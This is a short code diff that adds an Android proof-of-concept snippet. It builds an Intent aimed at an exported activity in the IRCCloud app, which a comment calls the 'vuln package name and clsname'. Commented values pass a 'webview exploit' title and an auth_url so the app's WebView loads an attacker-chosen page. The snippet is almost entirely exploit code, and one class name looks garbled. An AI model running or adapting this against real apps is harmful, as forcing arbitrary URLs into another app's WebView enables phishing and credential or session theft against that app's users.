@@ -1,0 +1,15 @@
+Intent a = new Intent();
+a.setClassName( packageName: "", className: ""); ///pname: "com.irccloud.android", classname: "com.irccloud.android.activity.SAMayth" --> vuln package name and clsname
+a.putExtra( name: "", value: "");	//name: ""title", value: "webview exploit" // if required then use it or not use 		
+a.putExtra(name: "", value: "");             ///name : "auth_url", value: "https://www.bing.com"  --> auth_url based on name of url(fetching) inside app 
+
+
+startActivity(a);
+
+
+
+
+
+
+
+
